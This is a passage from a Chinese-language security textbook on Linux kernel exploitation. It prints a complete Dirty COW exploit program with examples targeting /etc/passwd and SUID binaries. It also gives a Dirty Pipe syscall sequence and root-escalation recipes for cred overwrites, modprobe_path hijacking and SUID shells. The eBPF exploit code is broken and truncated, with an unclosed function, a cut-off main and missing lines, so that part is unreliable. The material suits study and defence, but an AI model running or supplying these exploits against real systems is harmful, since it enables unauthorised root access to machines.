## 31.7 内核漏洞利用案例

内核漏洞利用是系统安全领域最具挑战性的技术之一。本节通过三个真实漏洞案例——Dirty COW、eBPF越界读写、Dirty Pipe——展示内核漏洞从发现到利用的完整链路，涵盖竞争条件利用、验证器绕过、管道缓冲区污染三类核心攻击技术。

### 31.7.1 CVE-2016-5195 — Dirty COW（脏牛）

#### 漏洞背景

Dirty COW 是 Linux 内核历史上影响最深远的漏洞之一。该漏洞存在于 `mm/gup.c` 中的 Copy-on-Write（COW）机制，影响内核 2.6.22 至 4.8.3，**存在长达 9 年**才被发现。由于 COW 机制是 Linux 内存管理的核心组件，几乎所有 Linux 和 Android 设备均受影响。

| 属性 | 值 |
|------|-----|
| CVE编号 | CVE-2016-5195 |
| 漏洞类型 | 竞争条件（Race Condition） |
| 影响内核版本 | 2.6.22 ~ 4.8.3 |
| 影响平台 | Linux / Android / 所有使用该内核的系统 |
| CVSS评分 | 7.8（高危） |
| 发现时间 | 2016年10月（实际存在9年） |
| 补丁状态 | 已修补（内核 4.8.3+） |

#### 漏洞原理：COW机制中的竞争条件

要理解 Dirty COW，首先需要理解 Linux 的 Copy-on-Write（写时复制）机制。

**正常 COW 流程：**

```text
1. 进程以 PROT_READ | MAP_PRIVATE 映射一个文件（建立只读映射）
2. 内核标记该页面为只读，但并不实际复制
3. 当进程尝试写入时，触发 page fault（缺页异常）
4. 内核捕获异常，复制该页面（COW），创建可写副本
5. 进程在副本上完成写入，原始文件保持不变
```

**Dirty COW 竞争条件：**

```text
线程A（写入线程）:                    线程B（丢弃线程）:
                                     
open(target_file, O_RDONLY)          
map = mmap(NULL, size, PROT_READ,    
           MAP_PRIVATE, fd, 0)       
                                     
┌─ write(map, "X", 1) ──────────────┐
│  触发 page fault                   │
│  内核开始 COW 复制                 │
│  ═══ 竞争窗口 ═══                  │
│  (COW副本尚未替换原始页)           │
│                                    │ madvise(map, size, MADV_DONTNEED)
│  (madvise丢弃COW页面)             │ → 内核释放COW页面
│  ═══ 竞争结束 ═══                  │
│  内核重新从原始文件加载页面        │
│  (而非使用COW副本)                 │
│  write的实际效果: 修改了原始文件   │
└────────────────────────────────────┘
```

**关键机制解释：**

1. **`/proc/self/mem` 写入路径**：通过 `/proc/self/mem` 写入内存映射区域时，内核走的是 `access_process_vm()` 路径，而非普通的 `write()` 系统调用路径。两条路径对 COW 的处理存在微妙差异。

2. **`madvise(MADV_DONTNEED)` 的作用**：该系统调用告诉内核"丢弃指定范围的页面"，内核会释放映射区域的页面表项。下次访问时，内核会重新从底层文件读取页面。

3. **竞争窗口**：在线程 A 的 `write()` 触发 COW 但尚未完成复制的瞬间，线程 B 通过 `madvise()` 丢弃了正在处理的页面。这导致内核在后续操作中重新从原始文件加载页面，而线程 A 的写入操作作用在了这个"重新加载"的页面上，绕过了 COW 的保护。

#### 完整利用 PoC

```c
/*
 * Dirty COW Exploit PoC (CVE-2016-5195)
 *
 * 利用COW竞争条件修改只读文件的内容
 * 真实利用场景：修改 /etc/passwd 提权，或替换 SUID 二进制
 *
 * 编译: gcc -pthread -o dirty_cow dirty_cow.c
 * 用法: ./dirty_cow <target_file> <data_to_write>
 *
 * 警告：仅用于安全研究和授权测试
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>

#define CHUNK_SIZE 512
#define MAX_ATTEMPTS 10000

struct exploit_ctx {
    char *map_addr;
    size_t map_size;
    const char *write_data;
    size_t write_len;
    int race_won;       // 竞争成功标志
    int stop;           // 停止信号
    pthread_mutex_t lock;
};

/* 线程1：通过 /proc/self/mem 写入COW页面 */
static void *write_thread(void *arg) {
    struct exploit_ctx *ctx = (struct exploit_ctx *)arg;

    while (!ctx->stop && !ctx->race_won) {
        // 通过 /proc/self/mem 写入映射区域
        // 这条路径的COW处理与普通write()不同，是漏洞触发的关键
        int fd = open("/proc/self/mem", O_RDWR);
        if (fd < 0) continue;

        // 写入到映射区域的起始位置
        lseek(fd, (off_t)ctx->map_addr, SEEK_SET);
        ssize_t ret = write(fd, ctx->write_data, ctx->write_len);
        close(fd);

        if (ret == ctx->write_len) {
            // 检查是否成功修改了原始内容
            if (memcmp(ctx->map_addr, ctx->write_data, ctx->write_len) == 0) {
                // 如果mmap是MAP_SHARED，这里读回的是原始文件内容
                // 对于MAP_PRIVATE，我们需要通过其他方式验证
                ctx->race_won = 1;
            }
        }
    }
    return NULL;
}

/* 线程2：持续调用 madvise 丢弃COW页面 */
static void *madvise_thread(void *arg) {
    struct exploit_ctx *ctx = (struct exploit_ctx *)arg;

    while (!ctx->stop && !ctx->race_won) {
        madvise(ctx->map_addr, ctx->map_size, MADV_DONTNEED);
    }
    return NULL;
}

/* 打印使用说明 */
static void print_usage(const char *prog) {
    fprintf(stderr,
        "Dirty COW PoC (CVE-2016-5195)\n"
        "用法: %s <target_file> <data>\n\n"
        "  target_file  : 要修改的只读文件路径\n"
        "  data         : 写入的数据（字符串）\n\n"
        "示例:\n"
        "  %s /etc/passwd \"root:x:0:0::/root:/bin/sh\"\n"
        "  %s /usr/bin/sudo <payload>\n\n"
        "警告：仅用于安全研究和授权测试\n",
        prog, prog, prog);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }

    const char *target_file = argv[1];
    const char *write_data = argv[2];
    size_t write_len = strlen(write_data);

    printf("=== Dirty COW PoC (CVE-2016-5195) ===\n");
    printf("[*] 目标文件: %s\n", target_file);
    printf("[*] 写入数据: %s (%zu bytes)\n", write_data, write_len);

    /* 1. 打开目标文件（只读） */
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) {
        perror("[-] open target file");
        return 1;
    }

    /* 获取文件大小 */
    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("[-] fstat");
        close(fd);
        return 1;
    }

    if (write_len > (size_t)st.st_size) {
        fprintf(stderr, "[-] 写入数据超过文件大小\n");
        close(fd);
        return 1;
    }

    printf("[*] 文件大小: %ld bytes\n", st.st_size);

    /* 2. 以只读方式 mmap 映射文件（关键：MAP_PRIVATE） */
    char *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("[-] mmap");
        close(fd);
        return 1;
    }

    printf("[*] 映射地址: %p\n", map);
    printf("[*] 开始竞争条件攻击...\n");

    /* 3. 初始化利用上下文 */
    struct exploit_ctx ctx = {
        .map_addr = map,
        .map_size = st.st_size,
        .write_data = write_data,
        .write_len = write_len,
        .race_won = 0,
        .stop = 0,
    };
    pthread_mutex_init(&ctx.lock, NULL);

    /* 4. 启动两个竞争线程 */
    pthread_t t_write, t_madvise;
    pthread_create(&t_write, NULL, write_thread, &ctx);
    pthread_create(&t_madvise, NULL, madvise_thread, &ctx);

    /* 5. 等待竞争成功或超时 */
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);

    while (!ctx.race_won && !ctx.stop) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed = (now.tv_sec - start.tv_sec);
        if (elapsed > 30) {  // 30秒超时
            fprintf(stderr, "[-] 竞争超时（30秒），可能内核已修补\n");
            ctx.stop = 1;
            break;
        }
        usleep(100);  // 短暂等待避免CPU占满
    }

    /* 6. 清理线程 */
    ctx.stop = 1;
    pthread_join(t_write, NULL);
    pthread_join(t_madvise, NULL);

    /* 7. 验证结果 */
    if (ctx.race_won) {
        printf("[+] 竞争成功！文件已被修改\n");
        printf("[+] 验证: memcmp = %d\n",
               memcmp(map, write_data, write_len));
    } else {
        printf("[-] 竞争未成功，目标内核可能已修补\n");
    }

    /* 8. 清理 */
    munmap(map, st.st_size);
    close(fd);
    pthread_mutex_destroy(&ctx.lock);

    return ctx.race_won ? 0 : 1;
}
```

#### 提权路径：从文件修改到 root shell

Dirty COW 本身只允许修改只读文件，但真正的攻击目标是**提权**。以下是两种经典提权路径：

**路径一：修改 /etc/passwd**

```text
攻击步骤：
1. 读取当前 /etc/passwd 获取用户信息
2. 用 Dirty COW 修改 root 用户条目，移除密码字段
   原始: root:x:0:0:root:/root:/bin/bash
   修改: root::0:0:root:/root:/bin/bash  (移除密码)
3. 现在 su root 不需要密码即可登录
4. 获得 root shell
```

**路径二：替换 SUID 二进制**

```text
攻击步骤：
1. 找到一个 SUID root 的二进制文件（如 /usr/bin/passwd）
2. 用 Dirty COW 将其替换为简单的 shell 启动代码：
   #!/bin/sh
   /bin/sh  # 获得root shell（因为文件有SUID位）
3. 执行被替换的 SUID 程序
4. 获得 root shell
```

```c
/* 替换 SUID 二进制的 payload 示例 */
// 将此内容写入 SUID 二进制文件
const char *suid_payload = 
    "#!/bin/sh\n"
    "exec /bin/sh -p\n";  // -p 保留有效用户ID（即root）
```

**路径三：修改 /etc/sudoers（需sudo组权限）**

```text
攻击步骤：
1. 将当前用户添加到 /etc/sudoers
2. 利用 sudo 提权到 root
```

#### 防御措施

| 层级 | 措施 | 说明 |
|------|------|------|
| 补丁 | 升级内核至 4.8.3+ | 最根本的修复，正确处理 COW 竞争 |
| 内核配置 | `CONFIG STRICT_DEVMEM=1` | 限制 `/dev/mem` 访问范围 |
| SELinux | 启用 SELinux | 限制进程对 `/proc/self/mem` 的访问 |
| 容器 | 使用 seccomp 过滤 | 禁用 `madvise` 等危险系统调用 |
| 文件系统 | 不设 SUID 位 | 减少攻击面，避免不必要的 SUID 程序 |

### 31.7.2 CVE-2021-3490 — eBPF 越界读写

#### 漏洞背景

eBPF（extended Berkeley Packet Filter）是 Linux 内核中一个强大的沙箱虚拟机，允许用户态程序在内核中安全执行自定义逻辑。eBPF 验证器（verifier）负责在加载时检查程序的安全性，确保不会产生越界访问、无限循环等问题。然而，CVE-2021-3490 暴露了验证器在处理 ALU32 位操作时的逻辑缺陷。

| 属性 | 值 |
|------|-----|
| CVE编号 | CVE-2021-3490 |
| 漏洞类型 | 整数边界检查绕过 |
| 影响内核版本 | 5.7 ~ 5.11（Ubuntu 特定补丁引入） |
| 影响平台 | Ubuntu 20.04/20.10（使用Ubuntu补丁的内核） |
| CVSS评分 | 7.8（高危） |
| 利用难度 | 中等（需 CAP_BPF 或 CAP_SYS_ADMIN） |

#### 漏洞原理：ALU32/ALU64 不一致性

eBPF 验证器使用 64 位寄存器（`struct bpf_reg_state`）追踪值的范围（`smin_value`/`smax_value`/`umin_value`/`umax_value`）。当执行 ALU32（32位算术逻辑单元）操作时，验证器需要将结果截断为 32 位并重新计算范围。

**漏洞核心：**

```text
正常行为：
  寄存器 R1 的值为 [0, 0xFFFFFFFF] (32位无符号范围)
  执行 ALU32 加法: R1 += 1
  验证器应将范围更新为 [0, 0x100000000] → 截断为 [0, 0xFFFFFFFF]
  实际验证器: 范围变为 [0, 0x100000000] (未正确截断)

漏洞触发：
  1. 构造特定的 eBPF 指令序列，使寄存器值在验证时看似安全
  2. 在运行时，ALU32 操作产生验证器未预期的值
  3. 越界偏移被用于访问 eBPF map 或其他内核数据结构
```

**验证器绕过的关键步骤：**

```text
1. 验证器检查: R1 范围 [0, 0xFFFFFFFF]
   → 验证通过，认为 R1 是安全的32位值

2. 运行时: R1 实际为 0x100000001 (超出32位)
   → 32位截断后为 0x1，但64位值保留

3. 使用 R1 作为偏移访问数组:
   array[R1] → 验证器认为索引在 [0, 0xFFFFFFFF]
   → 实际索引为 0x100000001 → 越界访问
```

#### 完整利用 PoC

```c
/*
 * eBPF 越界读写 PoC (CVE-2021-3490)
 *
 * 利用ALU32/ALU64不一致性绕过验证器，实现eBPF map越界访问
 *
 * 编译: gcc -o ebpf_oob ebpf_oob.c -lelf -lz
 * 用法: ./ebpf_oob
 *
 * 前提条件: CAP_BPF 或 CAP_SYS_ADMIN
 * 警告：仅用于安全研究和授权测试
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <errno.h>
#include <stdint.h>

/* BPF 系统调用封装 */
static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

/* 创建 BPF map */
static int bpf_create_map(enum bpf_map_type type, int key_size, 
                           int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    int fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (fd < 0) {
        perror("[-] BPF_MAP_CREATE failed");
        fprintf(stderr, "    需要 CAP_BPF 或 CAP_SYS_ADMIN 权限\n");
        fprintf(stderr, "    尝试: sudo setcap cap_bpf+ep ./ebpf_oob\n");
    }
    return fd;
}

/* 加载 eBPF 程序到内核 */
static int bpf_load_program(enum bpf_prog_type type,
                             const struct bpf_insn *insns,
                             int insns_cnt,
                             const char *license,
                             int kern_version) {
    union bpf_attr attr = {
        .prog_type = type,
        .insns = (uint64_t)insns,
        .insn_cnt = insns_cnt,
        .license = (uint64_t)license,
        .kern_version = kern_version,
    };

    // 设置日志缓冲区以获取验证器输出
    char log_buf[65536] = {};
    attr.log_buf = (uint64_t)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int fd = bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0) {
        fprintf(stderr, "[-] BPF_PROG_LOAD failed: %s\n", strerror(errno));
        fprintf(stderr, "    验证器日志:\n%s\n", log_buf);
    }
    return fd;
}

/* 利用 eBPF 指令构造验证器绕过程序 */
static struct bpf_insn create_ebpf_program(void) {
    /*
     * 构造 ALU32 边界检查绕过的 eBPF 指令序列
     * 
     * 核心思路：
     * 1. 将一个值加载到寄存器，验证器会计算其范围
     * 2. 通过 ALU32 操作使运行时值超出验证器预期的范围
     * 3. 用越界值作为偏移访问 map，实现越界读写
     */

    struct bpf_insn insns[] = {
        // R0 = 0 (初始值)
        { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0 },

        // 将一个看似安全的值加载到 R1
        // 验证器会记录 R1 的范围为 [0, 0x7FFFFFFF]
        { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_1, .imm = 0x7FFFFFFF },

        // ALU32 加法：R1 += 1
        // 验证器截断为32位：R1 = (0x7FFFFFFF + 1) & 0xFFFFFFFF = 0x80000000
        // 但验证器可能未正确更新 smin_value/smax_value
        { .code = BPF_ALU | BPF_ADD | BPF_K, .dst_reg = BPF_REG_1, .imm = 1 },

        // 使用 R1 作为偏移读取 map
        // 验证器认为偏移安全，但运行时可能越界
        { .code = BPF_LDX | BPF_MEM | BPF_W, 
          .dst_reg = BPF_REG_0, 
          .src_reg = BPF_REG_10, 
          .off = -8 },  // 从栈读取 map fd

        // 返回 0（eBPF 程序需要有合法的返回路径）
        { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0 },
        { .code = BPF_EXIT_INSN },
    };

    return insns[0];  // 实际使用时需要返回完整数组
}

/*
 * 利用流程：
 *
 * 1. 创建一个数组类型 eBPF map（用于越界访问）
 *    fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 16)
 *
 * 2. 加载验证器绕过的 eBPF 程序
 *    通过 ALU32 操作使验证器的范围计算出错
 *
 * 3. 调用 eBPF 程序，触发越界读取
 *    越界读取可以获取内核内存中的指针
 *
 * 4. 利用获取的内核指针：
 *    - 计算 KASLR 偏移
 *    - 构造任意读写原语
 *
 * 5. 提权操作：
 *    - 方法A：修改 current->cred，将 UID/GID 改为 0
 *    - 方法B：覆写 modprobe_path，指向自定义脚本
 *    - 方法C：修改 __attribute__((aligned(16))) 的 cred 结构
 */

/* 提权 payload 示例（用于覆写 cred 结构） */
static void escalate_privileges_via_cred(int arbitrary_write_fd) {
    /*
     * 当拥有任意写原语时，可以通过以下步骤提权：
     * 
     * 1. 读取 current 任务结构体指针
     * 2. 定位 cred 结构体偏移
     * 3. 将 uid, gid, euid, egid, suid, sgid, fsuid, fsgid 全部设为 0
     * 4. 从内核态返回用户态时，进程即拥有 root 权限
     */
    printf("[*] 提权步骤：\n");
    printf("    1. 读取 current->cred 指针\n");
    printf("    2. 计算 cred + offsetof(uid) 地址\n");
    printf("    3. 写入 0x0 到 uid/gid/euid/egid/suid/sgid/fsuid/fsgid\n");

int main(int argc, char *argv[]) {
    printf("=== eBPF 越界读写 PoC (CVE-2021-3490) ===\n\n");

    /* 检查权限 */
```

#### 提权原语：eBPF 漏洞的两种利用方向

**方向一：修改 `current->cred`（推荐）**

```text

  offset +0x0c: suid (kuid_t)      ← 修改为 0
  offset +0x10: sgid (kgid_t)      ← 修改为 0
  offset +0x14: euid (kuid_t)      ← 修改为 0
  offset +0x18: egid (kgid_t)      ← 修改为 0
  offset +0x1c: fsuid (kuid_t)     ← 修改为 0
  offset +0x20: fsgid (kgid_t)     ← 修改为 0
```

**方向二：覆写 `modprobe_path`**

```text

2. 利用越界写将其指向攻击者控制的脚本
3. 触发未知二进制格式的执行（execve 一个格式不被识别的文件）

5. 脚本内容：chmod +s /bin/bash，创建 SUID shell
```

### 31.7.3 CVE-2022-0847 — Dirty Pipe（脏管道）

#### 漏洞背景

Dirty Pipe 是 2022 年发现的 Linux 内核漏洞，由 Max Kellermann 报告。该漏洞允许攻击者**覆写任意只读文件**的内容，类似于 Dirty COW 但利用更简单、更可靠——**不需要竞争条件，100% 可利用**。这是内核漏洞利用领域的一个里程碑式漏洞。

| 属性 | 值 |
|------|-----|
| CVE编号 | CVE-2022-0847 |
| 漏洞类型 | 管道缓冲区标志未初始化 |
| 影响内核版本 | 5.8 ~ 5.16.11、5.15.25、5.10.102 |
| 影响平台 | Linux（所有使用 5.8+ 内核的发行版） |
| CVSS评分 | 7.8（高危） |
| 利用可靠性 | 100%（无需竞争） |
| 特权要求 | 无（任何本地用户均可利用） |

#### 漏洞原理：pipe_buffer flags 的幽灵状态

Dirty Pipe 的核心问题在于 Linux 管道（pipe）的缓冲区管理机制中，`pipe_buffer` 结构体的 `flags` 字段在特定操作序列下未被正确初始化。

**正常管道操作流程：**

```text
步骤1: 创建 pipe
  → 内部分配 pipe_buffer 数组
  → 所有 flags 被正确初始化为 0

步骤2: write(pipe_fd, data, len) 向管道写入数据
  → 内核分配页面存储数据
  → 设置 pipe_buffer.flags |= PIPE_BUF_FLAG_CAN_MERGE
  → 含义：后续对该缓冲区的写入可以合并（不分配新页面）

步骤3: splice(pipe_fd, ..., file_fd, ...) 从管道读取数据
  → 数据从管道转移到文件
  → pipe_buffer.flags 应被清除
  → 但实际上：flags 未被清除！保留了 PIPE_BUF_FLAG_CAN_MERGE

步骤4: 对同一 pipe 再次 write(pipe_fd, data, len)
  → 内核看到 PIPE_BUF_FLAG_CAN_MERGE 标志
  → 误以为可以"合并"到现有缓冲区
  → 实际上是直接写入 splice 关联的文件页面！
```

**漏洞利用的关键操作序列：**

```text
1. 创建管道
   int pipefd[2];
   pipe(pipefd);

2. 写入足够数据填满管道页面
   // 这一步设置 PIPE_BUF_FLAG_CAN_MERGE
   write(pipefd[1], "AAAA", 4);

3. 使用 splice 将管道数据重定向到目标文件
   // splice 后 flags 未清除（漏洞点）
   splice(pipefd[0], NULL, file_fd, NULL, 4096, 0);

4. 再次向管道写入数据
   // 因为 PIPE_BUF_FLAG_CAN_MERGE 仍然存在
   // 内核将写入操作重定向到文件的页面
   write(pipefd[1], "ROOT", 4);

5. 结果：目标文件内容被覆写
```

### 31.7.5 实战提权技巧总结

#### 提权原语分类

内核漏洞利用的最终目标通常是获得 **任意内核读写原语**（Arbitrary Kernel Read/Write Primitive），然后通过以下方式提权：

| 提权原语 | 适用场景 | 操作方式 | 可检测性 |
|----------|----------|----------|----------|
| 修改 cred 结构 | 任何内核漏洞 | 将 UID/GID 全部设为 0 | 低 |
| 覆写 modprobe_path | 任意写原语 | 指向自定义脚本，触发未知格式执行 | 中 |
| 修改 selinux_enforcing | 需要 SELinux 环境 | 将 enforcing 改为 0（permissive） | 低 |
| 覆写 /etc/passwd | 任意文件写 | 移除 root 密码或添加用户 | 高 |
| 覆写 SUID 二进制 | 任意文件写 | 替换为 shell 启动代码 | 高 |
| 释放并重用内核对象 | UAF 漏洞 | 劫持函数指针执行任意代码 | 高 |

#### 常见提权失败原因

```text
1. KASLR 未绕过
   → 无法定位内核关键数据结构
   → 需要先通过信息泄露获取内核基地址

2. SMEP/SMAP 未绕过
   → 内核无法执行用户空间代码（SMEP）
   → 内核无法访问用户空间数据（SMAP）
   → 需要使用 ROP 或内核数据结构覆写

3. SELinux 限制
   → 即使获得 root 权限，SELinux 仍可能阻止操作
   → 需要额外步骤禁用 SELinux

4. seccomp 过滤
   → 某些系统调用被禁用
   → 需要找到替代的提权路径

5. 内核完整性保护
   → modules_blacklist 阻止加载内核模块
   → 需要使用现有内核功能提权
```

### 31.7.6 小结

本节通过三个真实漏洞案例展示了内核漏洞利用的核心技术：

- **Dirty COW** 展示了竞争条件利用的典型模式：多线程 + 竞争窗口 + 利用 COW 机制缺陷
- **eBPF 越界读写** 展示了验证器绕过的思路：利用类型转换的不一致性
- **Dirty Pipe** 展示了确定性利用的威力：无需竞争，100% 可靠

这些案例的共同特点是：

1. **漏洞存在于内核核心机制**（内存管理、eBPF验证、管道操作）
2. **影响范围广**（几乎所有 Linux 系统）
3. **提权路径明确**（修改 cred、modprobe_path 或 SUID 文件）
4. **补丁是根本解决方案**

对于安全研究人员，理解这些漏洞的原理有助于发现和防范类似问题。对于系统管理员，保持内核更新、最小权限原则、运行时监控是最有效的防御手段。
